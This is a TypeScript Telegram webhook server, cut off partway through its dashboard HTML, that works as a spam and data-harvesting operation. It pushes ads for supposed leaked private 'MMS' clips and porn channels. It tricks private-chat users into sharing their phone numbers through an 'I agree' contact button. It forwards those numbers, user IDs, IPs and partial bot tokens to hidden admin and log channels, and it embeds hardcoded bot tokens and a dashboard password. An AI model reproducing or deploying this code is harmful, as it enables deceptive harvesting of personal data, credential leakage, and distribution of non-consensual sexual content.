import { serve } from "bun"
import NodeCache from "node-cache"

// Enhanced TypeScript Interfaces
interface TelegramResponse {
  ok: boolean
  description?: string
  result?: any
  parameters?: {
    retry_after?: number
  }
}

interface RequestLogEntry {
  id: string
  timestamp: string
  token: string
  status: "success" | "failed" | "rate_limited"
  responseTime: number
  errorReason?: string
  botUsername?: string
  userAgent?: string
  ipAddress?: string
}

interface ServerStats {
  totalRequests: number
  successfulRequests: number
  failedRequests: number
  rateLimitedRequests: number
  totalResponseTime: number
  averageResponseTime: number
  uptime: number
  memoryUsage: NodeJS.MemoryUsage
  activeConnections: number
}

interface TelegramUpdate {
  [key: string]: any
  message?: {
    chat: TelegramChat
    from?: TelegramUser
    contact?: TelegramContact
    text?: string
  }
  callback_query?: {
    message: { chat: TelegramChat }
    from: TelegramUser
    data?: string
  }
  channel_post?: {
    chat: TelegramChat
    sender_chat?: any
  }
  inline_query?: {
    id: string
    from: TelegramUser
    query: string
  }
  my_chat_member?: {
    chat: TelegramChat
    from: TelegramUser
  }
}

interface TelegramUser {
  id: number
  first_name: string
  last_name?: string
  username?: string
  language_code?: string
  is_bot?: boolean
}

interface TelegramChat {
  id: number
  type: "private" | "group" | "supergroup" | "channel"
  title?: string
  username?: string
}

interface TelegramContact {
  phone_number: string
  first_name: string
  last_name?: string
  user_id?: number
}

interface BotInfoResponse {
  ok: boolean
  result?: {
    id: number
    username: string
    first_name: string
    can_join_groups?: boolean
    can_read_all_group_messages?: boolean
    supports_inline_queries?: boolean
  }
}

interface AdContent {
  id: string
  type: "text" | "photo" | "video" | "document" | "photo_text_button"
  priority: number
  active: boolean
  content: {
    text?: string
    photos?: string[]
    video?: string
    document?: string
    buttons?: Array<{
      text: string
      url?: string
      callback_data?: string
    }>
  }
  targeting?: {
    chatTypes?: string[]
    languages?: string[]
    excludeUsers?: number[]
  }
  analytics: {
    impressions: number
    clicks: number
    conversions: number
  }
}

interface InteractionLog {
  id: string
  timestamp: string
  botUsername: string
  botToken: string
  user: {
    id: number
    fullName: string
    username: string
    languageCode?: string
    isBot: boolean
  }
  chat: {
    id: number
    type: string
    title?: string
  }
  updateType: string
  metadata: {
    userAgent?: string
    ipAddress?: string
    responseTime: number
  }
}

// Configuration Constants
const CONFIG = {
  MAX_INTERACTIONS_BUFFER: 15,
  LOG_CHANNEL_ID: "-1002529607208",
  ADMIN_CHANNEL_ID: "-1002628971429",
  ADMIN_BOT_TOKEN: "7734817163:AAESWrSeVKg5iclnM2R2SvOA5xESClG8tFM",
  DASHBOARD_PASSWORD: "ashu45",
  RATE_LIMIT_WINDOW: 60000, // 1 minute
  RATE_LIMIT_MAX_REQUESTS: 30,
  REQUEST_TIMEOUT: 15000,
  RETRY_ATTEMPTS: 3,
  CACHE_TTL: 86400, // 24 hours
} as const

// Enhanced Log Bot Configuration with Health Monitoring
const LOG_BOT_TOKENS = [
  { name: "primary", token: "7875120978:AAFjW1AzILgOc4Iq49zciITTmbK50VhG9hI", health: 100, lastUsed: 0 },
  { name: "secondary", token: "7795943772:AAGTP4rr6kTcedMCSWa1u0SyFvaKLFufQJk", health: 100, lastUsed: 0 },
  { name: "backup1", token: "7073375728:AAG0yU3Xz8-KevZj_Ngyr1jz03F1WprtpPI", health: 100, lastUsed: 0 },
  { name: "backup2", token: "7526249340:AAHDbn1a4luBxXh3DHrEXMjKVfjIiQfWz9Q", health: 100, lastUsed: 0 },
]

// Embedded Ad Data
const PHOTO = "https://graph.org/file/81bfc92532eb6ce8f467a-4cdb9832784225218b.jpg";
const CAPTION = `
<b>🔥 NEW MMS LEAKS OUT NOW!</b>

🎬 100% Free Access  
💦 Uncensored Private Clips  
📥 Click any button below to unlock👇
`;
const BUTTONS = [
  { text: "🔞 VIDEOS", url: "https://t.me/+NiLqtvjHQoFhZjQ1" },
  { text: "📁 FILES", url: "https://t.me/+fvFJeSbZEtc2Yjg1" },
];

// Optional: Extra Random Ads (Advanced Carousel Style)
const RANDOM_ADS = [
  {
    id: "leak_promo_1",
    type: "photo_text_button",
    content: {
      photos: [
        "https://i.ibb.co/zhnh3pmC/x.jpg",
        "https://i.ibb.co/XkbDXc2n/x.jpg",
        "https://i.ibb.co/PG9W3XvR/x.jpg"
      ],
      text: `
<b>💥 PREMIUM 18+ VIDEOS</b>

✅ Latest Uncut  
✅ 1080p Quality  
👀 Click to Preview ⬇️
      `,
      buttons: [
        { text: "WATCH NOW 🔞", url: "https://t.me/+aBNf12PKxfFiOTBl" },
        { text: "JOIN CHANNEL 📥", url: "https://t.me/+aBNf12PKxfFiOTBl" }
      ],
    },
  },
  {
    id: "earn_online_1",
    type: "photo_text_button",
    content: {
      photos: ["https://i.ibb.co/1GTzStDS/x.jpg"],
      text: `
<b>💸 Earn Online with Zero Investment</b>

📈 Learn Real Strategies  
🧠 No Fluff, Just Results  
🔗 Join <b>Earn With Obito</b> Channel Now
      `,
      buttons: [
        { text: "JOIN NOW 💰", url: "https://t.me/+jd_c7q05bp9hZWJl" },
        { text: "DAILY UPDATES", url: "https://t.me/+jd_c7q05bp9hZWJl" }
      ],
    },
  }
];


// Enhanced Cache System
const cache = new NodeCache({
  stdTTL: CONFIG.CACHE_TTL,
  checkperiod: 600,
  useClones: false,
  maxKeys: 10000,
})

// Global State Management
class ServerState {
  private static instance: ServerState
  public startTime: number = Date.now()
  public interactionBuffer: InteractionLog[] = []
  public activeConnections = 0
  public rateLimitMap: Map<string, { count: number; resetTime: number }> = new Map()

  static getInstance(): ServerState {
    if (!ServerState.instance) {
      ServerState.instance = new ServerState()
    }
    return ServerState.instance
  }

  incrementConnections(): void {
    this.activeConnections++
  }

  decrementConnections(): void {
    this.activeConnections = Math.max(0, this.activeConnections - 1)
  }

  addInteraction(interaction: InteractionLog): void {
    this.interactionBuffer.unshift(interaction)
    if (this.interactionBuffer.length > CONFIG.MAX_INTERACTIONS_BUFFER * 2) {
      this.interactionBuffer = this.interactionBuffer.slice(0, CONFIG.MAX_INTERACTIONS_BUFFER)
    }
  }

  getStats(): ServerStats {
    const memoryUsage = process.memoryUsage()
    const uptime = Date.now() - this.startTime

    const totalRequests = (cache.get("totalRequests") as number) || 0
    const successfulRequests = (cache.get("successfulRequests") as number) || 0
    const failedRequests = (cache.get("failedRequests") as number) || 0
    const rateLimitedRequests = (cache.get("rateLimitedRequests") as number) || 0
    const totalResponseTime = (cache.get("totalResponseTime") as number) || 0

    return {
      totalRequests,
      successfulRequests,
      failedRequests,
      rateLimitedRequests,
      totalResponseTime,
      averageResponseTime: totalRequests > 0 ? totalResponseTime / totalRequests : 0,
      uptime,
      memoryUsage,
      activeConnections: this.activeConnections,
    }
  }
}

const serverState = ServerState.getInstance()

// Utility Functions
class Utils {
  static sanitizeHtml(text: string): string {
    if (!text) return ""
    return text
      .replace(/[\u0300-\u036f\u1AB0-\u1AFF\u1DC0-\u1DFF\u20D0-\u20FF\uFE20-\uFE2F]/g, "")
      .replace(/[\u0080-\uFFFF]/g, "")
      .replace(/[<>&"']/g, (match) => {
        const entities: { [key: string]: string } = {
          "<": "&lt;",
          ">": "&gt;",
          "&": "&amp;",
          '"': "&quot;",
          "'": "&#x27;",
        }
        return entities[match] || match
      })
      .replace(/\s+/g, " ")
      .trim()
  }

  static generateId(): string {
    return Date.now().toString(36) + Math.random().toString(36).substr(2)
  }

  static formatUptime(ms: number): string {
    const seconds = Math.floor(ms / 1000)
    const minutes = Math.floor(seconds / 60)
    const hours = Math.floor(minutes / 60)
    const days = Math.floor(hours / 24)

    if (days > 0) return `${days}d ${hours % 24}h ${minutes % 60}m`
    if (hours > 0) return `${hours}h ${minutes % 60}m ${seconds % 60}s`
    if (minutes > 0) return `${minutes}m ${seconds % 60}s`
    return `${seconds}s`
  }

  static formatBytes(bytes: number): string {
    const sizes = ["Bytes", "KB", "MB", "GB"]
    if (bytes === 0) return "0 Bytes"
    const i = Math.floor(Math.log(bytes) / Math.log(1024))
    return Math.round((bytes / Math.pow(1024, i)) * 100) / 100 + " " + sizes[i]
  }

  static getClientIP(req: Request): string {
    const forwarded = req.headers.get("x-forwarded-for")
    const realIP = req.headers.get("x-real-ip")
    const cfIP = req.headers.get("cf-connecting-ip")

    return cfIP || realIP || forwarded?.split(",")[0] || "unknown"
  }

  static isRateLimited(identifier: string): boolean {
    const now = Date.now()
    const rateLimitData = serverState.rateLimitMap.get(identifier)

    if (!rateLimitData || now > rateLimitData.resetTime) {
      serverState.rateLimitMap.set(identifier, {
        count: 1,
        resetTime: now + CONFIG.RATE_LIMIT_WINDOW,
      })
      return false
    }

    if (rateLimitData.count >= CONFIG.RATE_LIMIT_MAX_REQUESTS) {
      return true
    }

    rateLimitData.count++
    return false
  }
}

// Enhanced Logging System
class Logger {
  static storeRequestLog(entry: Partial<RequestLogEntry>): void {
    const logEntry: RequestLogEntry = {
      id: Utils.generateId(),
      timestamp: new Date().toISOString(),
      token: entry.token || "unknown",
      status: entry.status || "failed",
      responseTime: entry.responseTime || 0,
      errorReason: entry.errorReason,
      botUsername: entry.botUsername,
      userAgent: entry.userAgent,
      ipAddress: entry.ipAddress,
    }

    const requestLog = (cache.get("requestLog") as RequestLogEntry[]) || []
    requestLog.unshift(logEntry)

    if (requestLog.length > 1000) {
      requestLog.splice(500) // Keep only latest 500 entries
    }

    cache.set("requestLog", requestLog)

    // Update statistics
    const totalRequests = ((cache.get("totalRequests") as number) || 0) + 1
    cache.set("totalRequests", totalRequests)

    if (entry.status === "success") {
      const successfulRequests = ((cache.get("successfulRequests") as number) || 0) + 1
      cache.set("successfulRequests", successfulRequests)
    } else if (entry.status === "rate_limited") {
      const rateLimitedRequests = ((cache.get("rateLimitedRequests") as number) || 0) + 1
      cache.set("rateLimitedRequests", rateLimitedRequests)
    } else {
      const failedRequests = ((cache.get("failedRequests") as number) || 0) + 1
      cache.set("failedRequests", failedRequests)
    }

    if (entry.responseTime) {
      const totalResponseTime = ((cache.get("totalResponseTime") as number) || 0) + entry.responseTime
      cache.set("totalResponseTime", totalResponseTime)
    }
  }

  static formatInteractionLog(interactions: InteractionLog[]): string {
    return interactions
      .map((interaction, index) => {
        const user = interaction.user
        const chat = interaction.chat

        return `${index + 1}. <b>Bot:</b> @${Utils.sanitizeHtml(interaction.botUsername)}
<b>User:</b> ${Utils.sanitizeHtml(user.fullName)} (@${Utils.sanitizeHtml(user.username)})
<b>User ID:</b> <code>${user.id}</code>
<b>Chat Type:</b> <code>${Utils.sanitizeHtml(chat.type)}</code>
<b>Update Type:</b> <code>${Utils.sanitizeHtml(interaction.updateType)}</code>
<b>Time:</b> <code>${new Date(interaction.timestamp).toLocaleString()}</code>
<b>Response Time:</b> <code>${interaction.metadata.responseTime.toFixed(2)}ms</code>
<b>Token:</b> <code>${interaction.botToken.substring(0, 10)}...</code>`
      })
      .join("\n\n")
  }
}

// Enhanced HTTP Client with Circuit Breaker Pattern
class TelegramAPI {
  private static circuitBreaker: Map<string, { failures: number; lastFailure: number; isOpen: boolean }> = new Map()

  static async retryOperation<T>(
    operation: () => Promise<T>,
    maxRetries: number = CONFIG.RETRY_ATTEMPTS,
    baseDelay = 1000,
  ): Promise<T> {
    let lastError: Error | null = null

    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        return await operation()
      } catch (error: any) {
        lastError = error

        if (attempt === maxRetries - 1) break

        // Handle specific error types
        if (error.message?.includes("rate limit") || error.message?.includes("Too Many Requests")) {
          const retryAfter = error.parameters?.retry_after || 60
          await new Promise((resolve) => setTimeout(resolve, retryAfter * 1000))
          continue
        }

        if (["ECONNRESET", "ETIMEDOUT", "ECONNREFUSED"].includes(error.code)) {
          const delay = Math.min(baseDelay * Math.pow(2, attempt), 30000) + Math.random() * 1000
          await new Promise((resolve) => setTimeout(resolve, delay))
          continue
        }

        // For other errors, use exponential backoff
        const delay = baseDelay * Math.pow(2, attempt) + Math.random() * 1000
        await new Promise((resolve) => setTimeout(resolve, delay))
      }
    }

    throw lastError || new Error("Operation failed after retries")
  }

  static async sendMessage(
    botToken: string,
    chatId: string | number,
    text: string,
    options: {
      parse_mode?: "HTML" | "Markdown"
      reply_markup?: any
      disable_web_page_preview?: boolean
    } = {},
  ): Promise<TelegramResponse> {
    const messageData = {
      chat_id: chatId,
      text: text.substring(0, 4096),
      parse_mode: options.parse_mode || "HTML",
      disable_web_page_preview: options.disable_web_page_preview || false,
      ...options,
    }

    return this.makeRequest(botToken, "sendMessage", messageData)
  }

  static async sendPhoto(
    botToken: string,
    chatId: string | number,
    photo: string,
    options: {
      caption?: string
      parse_mode?: "HTML" | "Markdown"
      reply_markup?: any
    } = {},
  ): Promise<TelegramResponse> {
    const messageData = {
      chat_id: chatId,
      photo,
      caption: options.caption?.substring(0, 1024),
      parse_mode: options.parse_mode || "HTML",
      ...options,
    }

    return this.makeRequest(botToken, "sendPhoto", messageData)
  }

  static async getBotInfo(botToken: string): Promise<BotInfoResponse> {
    return this.makeRequest(botToken, "getMe", {}) as Promise<BotInfoResponse>
  }

  static async answerInlineQuery(
    botToken: string,
    inlineQueryId: string,
    results: any[],
    options: { cache_time?: number } = {},
  ): Promise<TelegramResponse> {
    const queryData = {
      inline_query_id: inlineQueryId,
      results: results.slice(0, 50), // Telegram limit
      cache_time: options.cache_time || 1,
    }

    return this.makeRequest(botToken, "answerInlineQuery", queryData)
  }

  private static async makeRequest(botToken: string, method: string, data: any): Promise<TelegramResponse> {
    const circuitKey = `${botToken}_${method}`
    const circuit = this.circuitBreaker.get(circuitKey)

    // Check circuit breaker
    if (circuit?.isOpen && Date.now() - circuit.lastFailure < 60000) {
      throw new Error("Circuit breaker is open")
    }

    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), CONFIG.REQUEST_TIMEOUT)

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
        signal: controller.signal,
      })

      clearTimeout(timeoutId)

      const result = (await response.json()) as TelegramResponse

      if (!result.ok) {
        throw new Error(`Telegram API error: ${result.description}`)
      }

      // Reset circuit breaker on success
      if (circuit) {
        circuit.failures = 0
        circuit.isOpen = false
      }

      return result
    } catch (error: any) {
      clearTimeout(timeoutId)

      // Update circuit breaker
      const currentCircuit = this.circuitBreaker.get(circuitKey) || { failures: 0, lastFailure: 0, isOpen: false }
      currentCircuit.failures++
      currentCircuit.lastFailure = Date.now()
      currentCircuit.isOpen = currentCircuit.failures >= 5
      this.circuitBreaker.set(circuitKey, currentCircuit)

      throw error
    }
  }
}

// Enhanced Ad Management System
class AdManager {
  static getActiveAds(chatType?: string, userLanguage?: string): AdContent[] {
    return AD_CAMPAIGNS.filter((ad) => {
      if (!ad.active) return false

      if (ad.targeting?.chatTypes && chatType) {
        return ad.targeting.chatTypes.includes(chatType)
      }

      return true
    }).sort((a, b) => a.priority - b.priority)
  }

  static async sendAds(
    botToken: string,
    chatId: string | number,
    chatType: string,
    userLanguage?: string,
    isContactShared = false,
  ): Promise<void> {
    const ads = this.getActiveAds(chatType, userLanguage)
    const promises: Promise<any>[] = []

    for (let i = 0; i < ads.length; i++) {
      const ad = ads[i]

      // Track impression
      ad.analytics.impressions++

      if (ad.type === "text") {
        if (i === 0 && chatType === "private" && !isContactShared) {
          // Add contact request to first ad for private chats
          const replyMarkup = {
            keyboard: [[{ text: "I agree", request_contact: true }]],
            resize_keyboard: true,
            one_time_keyboard: true,
          }

          promises.push(
            TelegramAPI.retryOperation(() =>
              TelegramAPI.sendMessage(botToken, chatId, ad.content.text!, { reply_markup: replyMarkup }),
            ),
          )
        } else {
          promises.push(TelegramAPI.retryOperation(() => TelegramAPI.sendMessage(botToken, chatId, ad.content.text!)))
        }
      } else if (ad.type === "photo_text_button" && ad.content.photos?.length) {
        const randomPhoto = ad.content.photos[Math.floor(Math.random() * ad.content.photos.length)]
        const buttons = ad.content.buttons?.map((button) => [button]) || []

        promises.push(
          TelegramAPI.retryOperation(() =>
            TelegramAPI.sendPhoto(botToken, chatId, randomPhoto, {
              caption: ad.content.text,
              reply_markup: buttons.length > 0 ? { inline_keyboard: buttons } : undefined,
            }),
          ),
        )
      }
    }

    await Promise.allSettled(promises)
  }

  static generateInlineResults(): any[] {
    const results: any[] = []
    const activeAds = this.getActiveAds()

    activeAds.forEach((ad, index) => {
      if (ad.type === "text") {
        results.push({
          type: "article",
          id: `ad_${ad.id}_${index}`,
          title: "Premium Content",
          description: "Click to view premium content",
          input_message_content: {
            message_text: ad.content.text,
            parse_mode: "HTML",
          },
        })
      } else if (ad.type === "photo_text_button" && ad.content.photos?.length) {
        const randomPhoto = ad.content.photos[Math.floor(Math.random() * ad.content.photos.length)]
        const buttons = ad.content.buttons?.map((button) => [button]) || []

        results.push({
          type: "photo",
          id: `ad_${ad.id}_${index}`,
          photo_url: randomPhoto,
          thumb_url: randomPhoto,
          caption: ad.content.text,
          parse_mode: "HTML",
          reply_markup: buttons.length > 0 ? { inline_keyboard: buttons } : undefined,
        })
      }
    })

    return results.slice(0, 10) // Limit to 10 results
  }
}

// Enhanced Log Bot Manager with Health Monitoring
class LogBotManager {
  private static currentBotIndex = 0
  private static botCooldowns: Map<string, number> = new Map()
  private static globalCooldownUntil = 0

  static async sendLogs(): Promise<void> {
    if (serverState.interactionBuffer.length < CONFIG.MAX_INTERACTIONS_BUFFER) return
    if (Date.now() < this.globalCooldownUntil) return

    const logsToSend = serverState.interactionBuffer.slice(0, CONFIG.MAX_INTERACTIONS_BUFFER)
    const message = Logger.formatInteractionLog(logsToSend)

    let sent = false
    let attempts = 0
    const maxAttempts = LOG_BOT_TOKENS.length

    while (!sent && attempts < maxAttempts) {
      const bot = LOG_BOT_TOKENS[this.currentBotIndex]
      const now = Date.now()

      // Check if bot is in cooldown
      const cooldownUntil = this.botCooldowns.get(bot.name) || 0
      if (now < cooldownUntil) {
        this.currentBotIndex = (this.currentBotIndex + 1) % LOG_BOT_TOKENS.length
        attempts++
        continue
      }

      try {
        await TelegramAPI.retryOperation(() => TelegramAPI.sendMessage(bot.token, CONFIG.LOG_CHANNEL_ID, message))

        sent = true
        bot.health = Math.min(100, bot.health + 5) // Improve health on success
        bot.lastUsed = now

        console.log(`✅ Logs sent successfully using ${bot.name} bot`)

        // Remove sent logs from buffer
        serverState.interactionBuffer.splice(0, CONFIG.MAX_INTERACTIONS_BUFFER)
      } catch (error: any) {
        bot.health = Math.max(0, bot.health - 10) // Decrease health on failure

        if (error.message?.includes("Too Many Requests")) {
          const retryAfter = error.parameters?.retry_after || 60
          this.botCooldowns.set(bot.name, now + retryAfter * 1000)
          console.warn(`⚠️ ${bot.name} bot rate limited for ${retryAfter}s`)
        } else {
          console.error(`❌ Failed to send logs with ${bot.name} bot:`, error.message)
        }
      }

      this.currentBotIndex = (this.currentBotIndex + 1) % LOG_BOT_TOKENS.length
      attempts++
    }

    if (!sent) {
      // Set global cooldown if all bots failed
      this.globalCooldownUntil = Date.now() + 30000 // 30 seconds
      console.error("❌ All log bots failed. Setting global cooldown.")
    }
  }

  static getBotHealthStatus(): Array<{ name: string; health: number; lastUsed: number; inCooldown: boolean }> {
    const now = Date.now()
    return LOG_BOT_TOKENS.map((bot) => ({
      name: bot.name,
      health: bot.health,
      lastUsed: bot.lastUsed,
      inCooldown: (this.botCooldowns.get(bot.name) || 0) > now,
    }))
  }
}

// Enhanced Contact Handler
class ContactHandler {
  static async handleContactShare(botToken: string, update: TelegramUpdate, botUsername: string): Promise<void> {
    const contact = update.message?.contact
    const user = update.message?.from
    const chat = update.message?.chat

    if (!contact || !user || !chat) return

    const now = new Date()
    const istOffset = 5.5 * 60 * 60 * 1000
    const istDate = new Date(now.getTime() + istOffset)

    const timeStr = istDate.toLocaleString("en-IN", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    })

    const contactMessage = `🆕 <b>New Contact Shared</b>

🤖 <b>Bot:</b> @${Utils.sanitizeHtml(botUsername)}
🔑 <b>Token:</b> <code>${botToken.substring(0, 10)}...</code>

👤 <b>User Details:</b>
• Name: ${Utils.sanitizeHtml(user.first_name)} ${Utils.sanitizeHtml(user.last_name || "")}
• Username: @${Utils.sanitizeHtml(user.username || "none")}
• User ID: <code>${user.id}</code>
• Language: ${Utils.sanitizeHtml(user.language_code || "unknown")}
• Is Bot: ${user.is_bot ? "✅ Yes" : "❌ No"}

📞 <b>Contact Details:</b>
• Name: ${Utils.sanitizeHtml(contact.first_name)} ${Utils.sanitizeHtml(contact.last_name || "")}
• Phone: <code>${Utils.sanitizeHtml(contact.phone_number)}</code>
• Contact User ID: <code>${contact.user_id || "N/A"}</code>

💬 <b>Chat Info:</b>
• Chat ID: <code>${chat.id}</code>
• Chat Type: ${Utils.sanitizeHtml(chat.type)}

🕐 <b>Time (IST):</b> ${timeStr}

🔗 <b>Actions:</b>
• <a href="tg://user?id=${user.id}">Open User Chat</a>`

    try {
      await TelegramAPI.retryOperation(() =>
        TelegramAPI.sendMessage(CONFIG.ADMIN_BOT_TOKEN, CONFIG.ADMIN_CHANNEL_ID, contactMessage),
      )

      console.log(`📞 Contact shared notification sent for user ${user.id}`)
    } catch (error) {
      console.error("❌ Failed to send contact notification:", error)
    }
  }
}

// Main Server Implementation
serve({
  port: process.env.PORT || 3000,

  async fetch(req: Request): Promise<Response> {
    const startTime = performance.now()
    const url = new URL(req.url)
    const method = req.method
    const pathname = url.pathname
    const userAgent = req.headers.get("user-agent") || "unknown"
    const clientIP = Utils.getClientIP(req)

    serverState.incrementConnections()

    try {
      // Rate limiting
      if (Utils.isRateLimited(clientIP)) {
        return new Response("Rate limit exceeded", {
          status: 429,
          headers: { "Retry-After": "60" },
        })
      }

      // Webhook handler
      if (method === "POST" && pathname.startsWith("/bot/")) {
        const botToken = pathname.split("/bot/")[1]

        if (!botToken || !botToken.includes(":")) {
          Logger.storeRequestLog({
            token: botToken || "invalid",
            status: "failed",
            responseTime: performance.now() - startTime,
            errorReason: "Invalid bot token format",
            userAgent,
            ipAddress: clientIP,
          })
          return new Response("Invalid bot token format", { status: 400 })
        }

        try {
          const update = (await req.json()) as TelegramUpdate

          // Process update
          const result = await this.processUpdate(update, botToken, userAgent, clientIP, startTime)

          Logger.storeRequestLog({
            token: botToken,
            status: "success",
            responseTime: performance.now() - startTime,
            userAgent,
            ipAddress: clientIP,
          })

          return new Response("OK", { status: 200 })
        } catch (error: any) {
          Logger.storeRequestLog({
            token: botToken,
            status: "failed",
            responseTime: performance.now() - startTime,
            errorReason: error.message,
            userAgent,
            ipAddress: clientIP,
          })

          console.error("❌ Webhook processing error:", error)
          return new Response("OK", { status: 200 }) // Always return 200 to Telegram
        }
      }

      // Status page routes
      if (method === "GET" && pathname === "/") {
        return this.handleStatusPage()
      }

      if (method === "GET" && pathname === "/status") {
        return this.handleDashboard(url)
      }

      if (method === "GET" && pathname === "/api/stats") {
        return this.handleStatsAPI()
      }

      return new Response("Not Found", { status: 404 })
    } finally {
      serverState.decrementConnections()
    }
  },

  async processUpdate(
    update: TelegramUpdate,
    botToken: string,
    userAgent: string,
    clientIP: string,
    startTime: number,
  ): Promise<void> {
    // Extract update information
    let chatId: string | number | null = null
    let user: TelegramUser | null = null
    let chat: TelegramChat | null = null
    let updateType = ""

    if (update.message) {
      updateType = "message"
      chat = update.message.chat
      chatId = chat.id
      user = update.message.from || null
    } else if (update.callback_query) {
      updateType = "callback_query"
      chat = update.callback_query.message.chat
      chatId = chat.id
      user = update.callback_query.from
    } else if (update.channel_post) {
      updateType = "channel_post"
      chat = update.channel_post.chat
      chatId = chat.id
      user = update.channel_post.sender_chat
    } else if (update.inline_query) {
      updateType = "inline_query"
      user = update.inline_query.from
    } else if (update.my_chat_member) {
      updateType = "my_chat_member"
      chat = update.my_chat_member.chat
      chatId = chat.id
      user = update.my_chat_member.from
    }

    if (!updateType) return

    // Get bot information
    const botInfo = await TelegramAPI.getBotInfo(botToken)
    const botUsername = botInfo.ok && botInfo.result ? botInfo.result.username : "unknown"

    // Log interaction
    if (user) {
      const interaction: InteractionLog = {
        id: Utils.generateId(),
        timestamp: new Date().toISOString(),
        botUsername,
        botToken,
        user: {
          id: user.id,
          fullName: user.last_name ? `${user.first_name} ${user.last_name}` : user.first_name,
          username: user.username || "none",
          languageCode: user.language_code,
          isBot: user.is_bot || false,
        },
        chat: chat
          ? {
              id: chat.id,
              type: chat.type,
              title: chat.title,
            }
          : { id: 0, type: "unknown" },
        updateType,
        metadata: {
          userAgent,
          ipAddress: clientIP,
          responseTime: performance.now() - startTime,
        },
      }

      serverState.addInteraction(interaction)

      // Trigger log sending if buffer is full
      if (serverState.interactionBuffer.length >= CONFIG.MAX_INTERACTIONS_BUFFER) {
        LogBotManager.sendLogs().catch((error) => console.error("❌ Background log sending failed:", error))
      }
    }

    // Handle inline queries
    if (updateType === "inline_query" && update.inline_query?.id) {
      const results = AdManager.generateInlineResults()
      await TelegramAPI.answerInlineQuery(botToken, update.inline_query.id, results)
      return
    }

    // Handle contact sharing
    if (update.message?.contact) {
      await ContactHandler.handleContactShare(botToken, update, botUsername)
    }

    // Send ads if we have a chat ID
    if (chatId && chat) {
      const isContactShared = !!update.message?.contact

      // Send ads asynchronously for better performance
      AdManager.sendAds(botToken, chatId, chat.type, user?.language_code, isContactShared).catch((error) =>
        console.error("❌ Ad sending failed:", error),
      )
    }
  },

  handleStatusPage(): Response {
    const stats = serverState.getStats()
    const uptime = Utils.formatUptime(stats.uptime)

    const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Bot Server Status</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        .status-icon {
            font-size: 4rem;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        h1 {
            color: #2d3748;
            margin-bottom: 30px;
            font-size: 2rem;
            font-weight: 700;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #f7fafc;
            padding: 20px;
            border-radius: 12px;
            border-left: 4px solid #4299e1;
        }
        .stat-value {
            font-size: 1.5rem;
            font-weight: bold;
            color: #2d3748;
            margin-bottom: 5px;
        }
        .stat-label {
            color: #718096;
            font-size: 0.9rem;
        }
        .status-badge {
            display: inline-block;
            background: #48bb78;
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .footer {
            color: #718096;
            font-size: 0.8rem;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="status-icon">🚀</div>
        <h1>Server Status</h1>
        <div class="status-badge">🟢 Online & Running</div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value">${uptime}</div>
                <div class="stat-label">Uptime</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">${stats.totalRequests.toLocaleString()}</div>
                <div class="stat-label">Total Requests</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">${stats.activeConnections}</div>
                <div class="stat-label">Active Connections</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">${stats.averageResponseTime.toFixed(1)}ms</div>
                <div class="stat-label">Avg Response Time</div>
            </div>
        </div>
        
        <div class="footer">
            <p>🤖 Advanced Telegram Bot Server</p>
            <p>Last updated: ${new Date().toLocaleString()}</p>
        </div>
    </div>
</body>
</html>`

    return new Response(html, {
      headers: { "Content-Type": "text/html" },
    })
  },

  handleDashboard(url: URL): Response {
    const password = url.searchParams.get("pass")

    if (password !== CONFIG.DASHBOARD_PASSWORD) {
      const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Protected Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .lock-icon {
            font-size: 3rem;
            margin-bottom: 20px;
            color: #4299e1;
        }
        h1 {
            color: #2d3748;
            margin-bottom: 30px;
            font-size: 1.8rem;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #4a5568;
            font-weight: 600;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 1rem;
            transition: border-color 0.3s;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #4299e1;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #4299e1;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .btn:hover {
